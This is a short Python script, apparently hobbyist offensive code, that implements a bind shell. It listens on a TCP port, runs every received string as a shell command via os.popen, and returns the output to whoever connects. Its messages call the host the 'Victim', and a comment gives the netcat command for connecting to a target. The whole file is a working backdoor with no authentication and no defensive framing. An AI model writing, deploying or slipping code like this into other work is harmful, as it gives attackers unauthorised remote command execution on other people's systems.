#!/usr/bin/python

# bind-sehll

# TODO: add more feature and fix the bugs
# TODO: fire up netcat and type nc <target public ip> <port> to connect to target


import subprocess
import socket
import sys
import os
host = "127.0.0.1"; 
port = 4736


while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.bind((host, port))
		s.listen(4)
		while True:
			c, addr = s.accept()
			c.send(str.encode("[*] Connected to Victim Successfully\n"))
			c.send(str.encode('[!] Remote Shell Installed Successfully.\n\n'))
			for tym in range(0,50):
				data = c.recv(1024)
				for line in os.popen(data[:].decode("utf-8")):
					c.send(str.encode(line))
	except KeyboardInterrupt:
		c.send("\n\t[ctrl+c] server forcely closed by Victim.\n")
		s.close()
		sys.exit(1)
	except socket.error:
		print("\n\t[-] Address", host,":",port, "already in use")
		s.close()
		break
